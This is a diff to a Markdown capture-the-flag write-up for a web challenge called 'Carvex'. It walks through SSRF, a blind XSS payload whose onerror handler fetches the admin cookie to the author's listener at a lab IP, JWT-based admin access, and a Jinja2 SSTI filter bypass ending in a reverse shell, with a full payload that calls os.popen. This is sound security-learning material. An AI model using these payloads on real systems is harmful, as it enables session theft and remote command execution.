@@ -1,13 +1,11 @@
 # Carvex Writeup
 
-I am Sahib Humbatzada and open always to challenges and ctfs. This type of challenges alwasys motivates me to learn web security.
+I am Sahib Humbatzada and open always to challenges and ctfs. This type of challenges always motivates me to learn web security.
 
 
 ## App Deployed
 
 ![alt text](img/image.png)
-
-
 
 ## Checklists for vulnerabilities
 
@@ -42,13 +40,11 @@ Let's add this `blind xss` payload and `photo url`, let's add our server.
 
 ![alt text](img/image-3.png)
 
-
-while  I submit this, on my http.server logs and i see that file retrieval happened.
+While  I submit this, on my http.server logs and i see that file retrieval happened.
 
 ![alt text](img/image-4.png)
 
 It means that we found `SSRF` vulnerability. It validated Photo URL without any validation of ip.
-
 
 ## Stealing cookie of admin
 
@@ -67,7 +63,6 @@ http://192.168.100.179:1337/steal.js
 ![alt text](img/image-6.png)
 
 But this way doesn't work. It gets my JS script but no execution.
-
 
 I created another user `testv2` and browsed all cars listing for first user. But i cannot see machines for first user. 
 
@@ -88,11 +83,9 @@ HTTPServer(('0.0.0.0', 1337), Handler).serve_forever()
 
 ![alt text](img/image-7.png)
 
-
 So, i see that `Referer` header is from port `5000`.
 
 Also, `accept` header shows image content types.
-
 
 That's why, I changed payloads as below.
 
@@ -102,7 +95,6 @@ http://192.168.100.179:1337/x.png" onerror="fetch('http://192.168.100.179:1337/s
 ```
 
 ![alt text](img/image-8.png)
-
 
 Yesss, it worked. I copy paste this cookie to jwt.io and see uid is `1`. It means most probably admin user.
 
@@ -116,12 +108,11 @@ Yes, we are admin user.
 
 ![alt text](img/image-11.png)
 
-
 We see `promo` feature, we can edit. We don't need to work with XSS as because we are admin.
 
 We need to paste payloads, which we achieve command execution.
 
-first, i started with SSTI.
+First, i started with SSTI.
 
 ![alt text](img/image-12.png)
 
@@ -133,12 +124,10 @@ I see error which i need to bypass.
 
 ![alt text](img/image-14.png)
 
-
 I submit below payloads from Google, I find.
 
 ```bash
 payload : {{ ''|attr('_'*2+'class'+'_'*2)|attr('_'*2+'mro'+'_'*2) }}
-
 ```
 
 ![alt text](img/image-15.png)
@@ -169,7 +158,7 @@ Hola, I got reverse shell.
 ![alt text](img/image-18.png)
 
 
-**Without AI,** on `OSWE` exam, you open swisskeyrepo payloads on github and there's one super payload waits you to achieve command execution
+**Without AI,** on `OSWE` exam, you open swisskeyrepo [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---filter-bypass) on github and there's one super payload waits you to achieve command execution
 
 ```bash
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
